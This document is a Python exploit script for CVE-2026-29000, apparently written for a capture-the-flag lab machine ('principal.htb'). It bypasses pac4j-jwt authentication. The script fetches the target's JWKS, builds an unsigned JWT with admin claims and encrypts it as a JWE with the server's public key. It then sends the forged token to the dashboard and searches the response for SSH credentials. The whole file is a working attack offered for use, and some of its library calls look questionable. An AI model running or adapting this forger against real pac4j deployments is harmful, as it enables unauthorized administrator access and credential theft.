#!/usr/bin/env python3
"""
CVE-2026-29000 JWT Forger
Exploits pac4j-jwt authentication bypass
"""

import jwt
import json
import requests
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64

# ============================================================
# Step 1: Fetch JWKS from target
# ============================================================
TARGET = "http://10.129.244.220"
JWKS_URL = f"{TARGET}/.well-known/jwks.json"

print("[*] Fetching JWKS from target...")
try:
    response = requests.get(JWKS_URL, timeout=5)
    jwks_data = response.json()
    print(f"[+] JWKS fetched successfully")
except Exception as e:
    print(f"[!] Error fetching JWKS: {e}")
    exit(1)

# ============================================================
# Step 2: Extract RSA Public Key
# ============================================================
print("[*] Extracting RSA public key...")
try:
    key_data = jwks_data['keys'][0]  # Get first key
    
    # Extract modulus and exponent
    n = int.from_bytes(base64.urlsafe_b64decode(key_data['n'] + '=='), 'big')
    e = int.from_bytes(base64.urlsafe_b64decode(key_data['e'] + '=='), 'big')
    
    # Create public key object
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key(default_backend())
    
    # Convert to PEM
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    print(f"[+] Public key extracted")
    print(f"[+] Key ID: {key_data.get('kid', 'N/A')}")
    
except Exception as e:
    print(f"[!] Error extracting key: {e}")
    exit(1)

# ============================================================
# Step 3: Create Malicious JWT Payload
# ============================================================
print("[*] Creating malicious JWT payload...")

# Create admin claims
payload = {
    "sub": "admin",
    "username": "admin",
    "roles": ["ADMIN", "USER"],
    "email": "admin@principal.htb",
    "iat": datetime.utcnow(),
    "exp": datetime.utcnow() + timedelta(hours=24),
    "iss": "pac4j",
    "aud": ["Principal"]
}

print(f"[+] Payload created:")
print(json.dumps(payload, default=str, indent=2))

# ============================================================
# Step 4: Create PlainJWT (UNSIGNED)
# ============================================================
print("[*] Creating PlainJWT (unsigned token)...")
plain_jwt = jwt.encode(
    payload,
    key=None,
    algorithm=None,
    options={"verify_signature": False}
)
print(f"[+] PlainJWT created (no signature)")

# ============================================================
# Step 5: Encrypt with Public Key (JWE)
# ============================================================
print("[*] Encrypting PlainJWT with public key (JWE)...")

try:
    # Use PyJWT to create JWE
    from jose import jwe
    from jose.constants import ALGORITHMS
    
    encrypted_token = jwe.encrypt(
        plain_jwt,
        public_pem.decode() if isinstance(public_pem, bytes) else public_pem,
        algorithm=ALGORITHMS.RSA_OAEP,
        encryption=ALGORITHMS.A256GCM
    )
    
    print(f"[+] Token encrypted successfully!")
    
except Exception as e:
    print(f"[!] JWE encryption failed: {e}")
    print("[*] Trying alternative encryption method...")
    
    # Alternative: just use the PlainJWT directly
    encrypted_token = plain_jwt
    print(f"[+] Using PlainJWT directly")

# ============================================================
# Step 6: Output Token
# ============================================================
print("\n" + "="*60)
print("FORGED TOKEN READY FOR EXPLOITATION")
print("="*60)
print(f"\nToken:\n{encrypted_token}\n")

# ============================================================
# Step 7: Test Token (Optional)
# ============================================================
print("[*] Attempting to use forged token...")
headers = {
    "Authorization": f"Bearer {encrypted_token}",
    "Cookie": f"JSESSIONID={encrypted_token}"
}

try:
    # Try to access dashboard
    r = requests.get(f"{TARGET}/dashboard", headers=headers, timeout=5)
    
    if r.status_code == 200:
        print(f"[+] SUCCESS! Token accepted (Status: {r.status_code})")
        print(f"[+] Dashboard accessible!")
    else:
        print(f"[?] Response status: {r.status_code}")
        if "SSH" in r.text or "credential" in r.text.lower():
            print(f"[+] Found SSH credentials in response!")
            print(r.text[:500])
        
except Exception as e:
    print(f"[!] Error testing token: {e}")

# Save token to file for later use
with open('forged_token.txt', 'w') as f:
    f.write(encrypted_token)

print(f"\n[+] Token saved to forged_token.txt")
